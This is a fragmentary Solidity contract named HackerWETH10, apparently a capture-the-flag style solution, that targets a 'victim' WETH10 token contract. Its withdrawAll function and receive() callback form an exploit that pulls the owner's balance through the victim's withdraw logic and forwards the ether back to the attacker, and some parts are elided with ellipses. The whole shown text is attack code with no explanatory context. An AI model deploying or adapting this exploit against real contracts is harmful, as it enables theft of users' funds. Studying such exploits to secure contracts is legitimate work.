...
contract HackerWETH10 {
    WETH10 public weth;
    address private immutable OWNER;
    constructor(address _victim) {
        OWNER = msg.sender;
        weth = WETH10(payable(_victim));
    }
    ...
    function withdrawAll() internal {
        uint bal = weth.balanceOf(OWNER);
        weth.transferFrom(OWNER, address(this), bal);
        weth.withdrawAll();
    }

    receive() external payable {
        if(msg.value == 10e18) {
            payable(OWNER).transfer(10e18);
        }
        else {
            weth.transfer(OWNER, msg.value);
        }
    }
}